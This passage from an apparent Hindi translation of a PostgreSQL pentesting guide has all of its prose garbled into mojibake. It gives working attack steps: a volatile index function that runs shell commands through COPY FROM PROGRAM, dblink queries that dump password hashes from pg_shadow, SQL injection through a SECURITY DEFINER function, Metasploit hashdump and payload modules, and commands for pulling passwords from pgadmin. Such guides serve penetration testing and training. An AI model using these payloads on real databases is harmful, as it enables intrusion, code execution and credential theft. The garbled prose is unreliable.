CREATE INDEX index_malicious ON public.temp_table (suid_function(data));

ALTER TABLE temp_table OWNER TO cloudsqladmin;

/* Replace the function with VOLATILE index function to bypass the PostgreSQL restriction */
CREATE OR REPLACE FUNCTION public.suid_function(text) RETURNS text
LANGUAGE sql VOLATILE AS 'COPY public.shell_commands_results (data) FROM PROGRAM ''/usr/bin/id''; select ''test'';';

ANALYZE public.temp_table;
```
рдПрд╕рдХреНрдпреВрдПрд▓ рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж, `shell_commands_results` рдЯреЗрдмрд▓ рдореЗрдВ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХреЛрдб рдХрд╛ рдЖрдЙрдЯрдкреБрдЯ рд╣реЛрддрд╛ рд╣реИ:
```
uid=2345(postgres) gid=2345(postgres) groups=2345(postgres)
```
### рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди

рдХреБрдЫ рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдП рдЧрдП postgresql рдЗрдВрд╕реНрдЯреЗрдВрд╕реЗрдЬ рдХрд┐рд╕реА рднреА рд╕реНрдерд╛рдиреАрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд▓реЙрдЧрд┐рди рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддреЗ рд╣реИрдВ, 127.0.0.1 рд╕реЗ **`dblink` рдлрд╝рдВрдХреНрд╢рди** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рд╕реНрдерд╛рдиреАрдп рд▓реЙрдЧрд┐рди рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ:
```sql
\du * # Get Users
\l    # Get databases
SELECT * FROM dblink('host=127.0.0.1
port=5432
user=someuser
password=supersecret
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
{% hint style="warning" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдкрд┐рдЫрд▓реЗ рдХреНрд╡реЗрд░реА рдХрд╛рдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП **рдлрд╝рдВрдХреНрд╢рди `dblink` рдореМрдЬреВрдж рд╣реЛрдирд╛ рдЪрд╛рд╣рд┐рдП**ред рдпрджрд┐ рдпрд╣ рдореМрдЬреВрдж рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдЗрд╕реЗ рдмрдирд╛рдиреЗ рдХреА рдХреЛрд╢рд┐рд╢ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```sql
CREATE EXTENSION dblink;
```
{% endhint %}

рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдЕрдзрд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡рд╛рд▓реЗ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХрд╛ рдкрд╛рд╕рд╡рд░реНрдб рд╣реИ, рд▓реЗрдХрд┐рди рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдмрд╛рд╣рд░реА рдЖрдИрдкреА рд╕реЗ рд▓реЙрдЧрд┐рди рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдЖрдк рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рд░реВрдк рдореЗрдВ рдХреНрд╡реЗрд░реА рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```sql
SELECT * FROM dblink('host=127.0.0.1
user=someuser
dbname=somedb',
'SELECT usename,passwd from pg_shadow')
RETURNS (result TEXT);
```
рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдореМрдЬреВрдж рд╣реИ рдпрд╛ рдирд╣реАрдВ рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рд╕рдВрднрд╡ рд╣реИ:
```sql
SELECT * FROM pg_proc WHERE proname='dblink' AND pronargs=2;
```
### **рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рд╕рд╛рдзрд╛рд░рд┐рдд рдлрд╝рдВрдХреНрд╢рди**

[**рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ**](https://www.wiz.io/blog/hells-keychain-supply-chain-attack-in-ibm-cloud-databases-for-postgresql), рдкреЗрдВрдЯреЗрд╕реНрдЯрд░реНрд╕ рдиреЗ IBM рджреНрд╡рд╛рд░рд╛ рдкреНрд░рджрд╛рди рдХрд┐рдП рдЧрдП рдПрдХ рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдЗрдВрд╕реНрдЯреЗрдВрд╕ рдореЗрдВ рдкреНрд░рд╛рдЗрд╡реЗрд╕реАрдХрд░рдг рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдкрд╛рдпрд╛ рдХреНрдпреЛрдВрдХрд┐ рдЗрд╕рдореЗрдВ **рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдлрд╝реНрд▓реИрдЧ** рд╣реИ:

<pre class="language-sql"><code class="lang-sql">CREATE OR REPLACE FUNCTION public.create_subscription(IN subscription_name text,IN host_ip text,IN portnum text,IN password text,IN username text,IN db_name text,IN publisher_name text)
RETURNS text
LANGUAGE 'plpgsql'
<strong>    VOLATILE SECURITY DEFINER
</strong>    PARALLEL UNSAFE
COST 100

AS $BODY$
DECLARE
persist_dblink_extension boolean;
BEGIN
persist_dblink_extension := create_dblink_extension();
PERFORM dblink_connect(format('dbname=%s', db_name));
PERFORM dblink_exec(format('CREATE SUBSCRIPTION %s CONNECTION ''host=%s port=%s password=%s user=%s dbname=%s sslmode=require'' PUBLICATION %s',
subscription_name, host_ip, portNum, password, username, db_name, publisher_name));
PERFORM dblink_disconnect();
тАж
</code></pre>

[**рджрд╕реНрддрд╛рд╡реЗрдЬрд╝реЛрдВ рдореЗрдВ рд╡рд┐рд╡рд░рдгрд┐рдд**](https://www.postgresql.org/docs/current/sql-createfunction.html) рддрд░реАрдХреЗ рд╕реЗ рдПрдХ **рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдлрд╝рдВрдХреНрд╢рди** рдЙрд╕ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рдирд┐рд╖реНрдкрд╛рджрд┐рдд рд╣реЛрддрд╛ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдорд╛рд▓рд┐рдХ рд╣реИред рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдлрд╝рдВрдХреНрд╢рди **SQL Injection рдХреЗ рд▓рд┐рдП рд╕рдВрдХрдЯрдЧреНрд░рд╕реНрдд рд╣реИ** рдпрд╛ рдпрд╣ рдХреБрдЫ **рдЖрдХреНрд░рдордХ рдХрд╛рд░реНрд░рд╡рд╛рдИ рдХрд░ рд░рд╣рд╛ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рд╣рдорд▓рд╛рд╡рд░ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рд╣реИрдВ**, рддреЛ рдЗрд╕реЗ **рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕ рдореЗрдВ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЛ рдмрдврд╝рд╛рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ**ред

рдкрд┐рдЫрд▓реЗ рдХреЛрдб рдХреА 4 рд╡реАрдВ рдкрдВрдХреНрддрд┐ рдореЗрдВ рдЖрдк рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ **рд╕реБрд░рдХреНрд╖рд╛ рдкрд░рд┐рднрд╛рд╖рд┐рдд рдХрд░рдиреЗ рд╡рд╛рд▓рд╛ рдлрд╝реНрд▓реИрдЧ** рд╣реИред
```sql
CREATE SUBSCRIPTION test3 CONNECTION 'host=127.0.0.1 port=5432 password=a
user=ibm dbname=ibmclouddb sslmode=require' PUBLICATION test2_publication
WITH (create_slot = false); INSERT INTO public.test3(data) VALUES(current_user);
```
рдФрд░ рдлрд┐рд░ **рдХрдорд╛рдВрдб рдЪрд▓рд╛рдПрдВ**:

<figure><img src="../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

### PL/pgSQL рдХреЗ рд╕рд╛рде рдкрд╛рд╕ рдмрд░реНрдЯрдлреЛрд░реНрд╕ рдкрд╛рд░ рдХрд░реЗрдВ

PL/pgSQL, рдПрдХ **рдкреВрд░реА рддрд░рд╣ рд╕реЗ рд╡рд┐рд╢реЗрд╖рддрд╛ рдпреБрдХреНрдд рдкреНрд░реЛрдЧреНрд░рд╛рдорд┐рдВрдЧ рднрд╛рд╖рд╛** рдХреЗ рд░реВрдк рдореЗрдВ, SQL рдХреА рддреБрд▓рдирд╛ рдореЗрдВ рдЕрдзрд┐рдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛рддреНрдордХ рдирд┐рдпрдВрддреНрд░рдг рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рд▓реВрдк рдФрд░ рдЕрдиреНрдп рдирд┐рдпрдВрддреНрд░рдг рд╕рдВрд░рдЪрдирд╛рдПрдВ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдХреА рдХреНрд╖рдорддрд╛** рд╢рд╛рдорд┐рд▓ рд╣реИред SQL рдХреЗ рдмрдпрд╛рди рдФрд░ рдЯреНрд░рд┐рдЧрд░ PL/pgSQL рднрд╛рд╖рд╛ рдореЗрдВ рдмрдирд╛рдИ рдЧрдИ рдлрд╝рдВрдХреНрд╢рди рдХреЛ рдХреЙрд▓ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред\
**рдЖрдк PostgreSQL рд╕реЗ рдпреВрдЬрд░ рдХреНрд░реЗрдбреЗрдВрд╢рд┐рдпрд▓реНрд╕ рдХреЛ рдмреНрд░реВрдЯ-рдлрд╝реЛрд░реНрд╕ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрд╕ рднрд╛рд╖рд╛ рдХрд╛ рджреБрд░реБрдкрдпреЛрдЧ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред**

{% content-ref url="../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md" %}
[pl-pgsql-password-bruteforce.md](../pentesting-web/sql-injection/postgresql-injection/pl-pgsql-password-bruteforce.md)
{% endcontent-ref %}

## **POST**
```
msf> use auxiliary/scanner/postgres/postgres_hashdump
msf> use auxiliary/scanner/postgres/postgres_schemadump
msf> use auxiliary/admin/postgres/postgres_readfile
msf> use exploit/linux/postgres/postgres_payload
msf> use exploit/windows/postgres/postgres_payload
```
### рд▓реЙрдЧрд┐рдВрдЧ

_**postgresql.conf**_ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдЕрдВрджрд░ рдЖрдк рдкреЛрд╕реНрдЯрдЧреНрд░реЗрд╕рдХреНрдпреВрдПрд▓ рд▓реЙрдЧ рдХреЛ рд╕рдХреНрд╖рдо рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдХреЛ рдмрджрд▓рдХрд░:
```bash
log_statement = 'all'
log_filename = 'postgresql-%Y-%m-%d_%H%M%S.log'
logging_collector = on
sudo service postgresql restart
#Find the logs in /var/lib/postgresql/<PG_Version>/main/log/
#or in /var/lib/postgresql/<PG_Version>/main/pg_log/
```
рдлрд┐рд░, рд╕реЗрд╡рд╛ рдХреЛ **рд░реАрд╕реНрдЯрд╛рд░реНрдЯ** рдХрд░реЗрдВред

### pgadmin

[pgadmin](https://www.pgadmin.org) PostgreSQL рдХреЗ рд▓рд┐рдП рдПрдХ рдкреНрд░рд╢рд╛рд╕рди рдФрд░ рд╡рд┐рдХрд╛рд╕ рдкреНрд▓реЗрдЯрдлрд╝реЙрд░реНрдо рд╣реИред\
рдЖрдк _**pgadmin4.db**_ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ **рдкрд╛рд╕рд╡рд░реНрдб** рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВред\
рдЖрдк рдЗрд╕ рд╕реНрдХреНрд░рд┐рдкреНрдЯ рдХреЗ рднреАрддрд░ _**decrypt**_ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЙрдиреНрд╣реЗрдВ рдбрд┐рдХреНрд░рд┐рдкреНрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py](https://github.com/postgres/pgadmin4/blob/master/web/pgadmin/utils/crypto.py)
```bash
sqlite3 pgadmin4.db ".schema"
sqlite3 pgadmin4.db "select * from user;"
sqlite3 pgadmin4.db "select * from server;"
string pgadmin4.db
```
### pg\_hba

рдЧреНрд░рд╛рд╣рдХ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХреЛ рдПрдХ рдХреЙрдиреНрдлрд╝рд┐рдЧ рдлрд╝рд╛рдЗрд▓ рджреНрд╡рд╛рд░рд╛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ _**pg\_hba.conf**_ рдирд╛рдорд┐рдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕ рдлрд╝рд╛рдЗрд▓ рдореЗрдВ рдПрдХ рд╕реЗрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдХрдИ рд░рд┐рдХреЙрд░реНрдб рд╣реЛрддреЗ рд╣реИрдВред рдПрдХ рд░рд┐рдХреЙрд░реНрдб рдореЗрдВ рд╕реЗ рдПрдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рд╕рд╛рдд рдкреНрд░рд╛рд░реВрдкреЛрдВ рдореЗрдВ рд╕реЗ рдПрдХ:

![](https://lh4.googleusercontent.com/Ff8YbD3ppYmN2Omp-4M-0AAVhLsr4c2i7d7HUjgkE-O6NZ5zbaST1hdMPrp1AL\_xTXJalYe0HYxUk76vWJUfHZ5GuCDvIL1A-sMV44Z0CYSVgLM9ttFTDu-BhzewBGc7FeMarTLqsu\_N1ztXJg)

**рдкреНрд░рддреНрдпреЗрдХ** рд░рд┐рдХреЙрд░реНрдб **рдПрдХ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдХрд╛рд░**, рдПрдХ **рдХреНрд▓рд╛рдЗрдВрдЯ IP рдкрддрд╛ рд╕реАрдорд╛** (рдпрджрд┐ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдХрд╛рд░ рдХреЗ рд▓рд┐рдП рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╣реИ), рдПрдХ **рдбреЗрдЯрд╛рдмреЗрд╕ рдирд╛рдо**, рдПрдХ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо**, рдФрд░ рдЗрди рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдП рдЬрд╛рдиреЗ рд╡рд╛рд▓реЗ **рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐** рдХреЛ рдирд┐рд░реНрджрд┐рд╖реНрдЯ рдХрд░рддрд╛ рд╣реИред рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЗрди рдкреИрд░рд╛рдореАрдЯрд░реНрд╕ рдХреЗ рд╕рд╛рде рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓реЗ рдХрдиреЗрдХреНрд╢рди рдкреНрд░рдХрд╛рд░, рдХреНрд▓рд╛рдЗрдВрдЯ рдкрддрд╛, рдЕрдиреБрд░реЛрдзрд┐рдд рдбреЗрдЯрд╛рдмреЗрд╕ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдирд╛рдо рдХреЗ рд╕рд╛рде **рдореЗрд▓ рдЦрд╛рдиреЗ рд╡рд╛рд▓рд╛ рдкрд╣рд▓рд╛ рд░рд┐рдХреЙрд░реНрдб** рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред "рдлреЙрд▓-рдереНрд░реВ" рдпрд╛ "рдмреИрдХрдЕрдк" рдирд╣реАрдВ рд╣реИ: **рдпрджрд┐ рдПрдХ рд░рд┐рдХреЙрд░реНрдб рдЪреБрдирд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдлрд▓ рд╣реЛрддрд╛ рд╣реИ, рддреЛ рдЖрдЧрд╛рдореА рд░рд┐рдХреЙрд░реНрдб рдХреЛ рдзреНрдпрд╛рди рдореЗрдВ рдирд╣реАрдВ рд▓рд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ**ред рдпрджрд┐ рдХреЛрдИ рд░рд┐рдХреЙрд░реНрдб рдореЗрд▓ рдирд╣реАрдВ рдЦрд╛рддрд╛ рд╣реИ, рддреЛ рдкрд╣реБрдБрдЪ рдирд┐рд╖реЗрдзрд┐рдд рдХреА рдЬрд╛рддреА рд╣реИред\
**рдкрд╛рд╕рд╡рд░реНрдб-рдЖрдзрд╛рд░рд┐рдд** рдкреНрд░рдорд╛рдгреАрдХрд░рдг рд╡рд┐рдзрд┐рдпрд╛рдБ **md5**, **crypt**, рдФрд░ **password** рд╣реИрдВред рдпреЗ рд╡рд┐рдзрд┐рдпрд╛рдБ рд╕рдорд╛рди рддрд░реАрдХреЗ рд╕реЗ рдХрд╛рдо рдХрд░рддреА рд╣реИрдВ рдХреЗрд╡рд▓ рдкрд╛рд╕рд╡рд░реНрдб рдХреЛ рдХрдиреЗрдХреНрд╢рди рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рднреЗрдЬрдиреЗ рдХреЗ рддрд░реАрдХреЗ рдореЗрдВ рдЕрдВрддрд░ рд╣реЛрддрд╛ рд╣реИ: рдХреНрд░рдорд╢рдГ, MD5-рд╣реИрд╢, рдХреНрд░рд┐рдкреНрдЯ-рдПрдиреНрдХреНрд░рд┐рдкреНрдЯреЗрдб, рдФрд░ рд╕рд╛рдл-рдкрд╛рдаред рдПрдХ рд╕реАрдорд╛ рд╣реИ рдХрд┐ рдХреНрд░рд┐рдкреНрдЯ рд╡рд┐рдзрд┐ pg\_authid рдореЗрдВ рдПрдиреНрдХреНрд░рд┐рдкреНрдЯ рдХрд┐рдП рдЧрдП рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рд╕рд╛рде рдХрд╛рдо рдирд╣реАрдВ рдХрд░рддреА рд╣реИред

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks Cloud тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж Twitter ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П Twitch ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе Youtube ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА рдХрдВрдкрдиреА рдХреЛ **HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреА рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ [**NFT**](https://opensea.io/collection/the-peass-family) рд╕рдВрдЧреНрд░рд╣
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS рдФрд░ HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**Discord рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдпрд╛ рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **рдХреЛред**

</details>

<figure><img src="../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

\
[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВ рдФрд░ рдЖрд╕рд╛рдиреА рд╕реЗ рд╡рд░реНрдХрдлрд╝реНрд▓реЛ рдмрдирд╛рдПрдВ рдФрд░ рд╕рдХреНрд░рд┐рдп рдХрд░реЗрдВ рдЬреЛ рджреБрдирд┐рдпрд╛ рдХреЗ рд╕рдмрд╕реЗ рдЙрдиреНрдирдд рд╕рдореБрджрд╛рдп рдЙрдкрдХрд░рдгреЛрдВ рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЪрд╛рд▓рд┐рдд рд╣реЛрддреЗ рд╣реИрдВред\
рдЖрдЬ рд╣реА рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ:

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
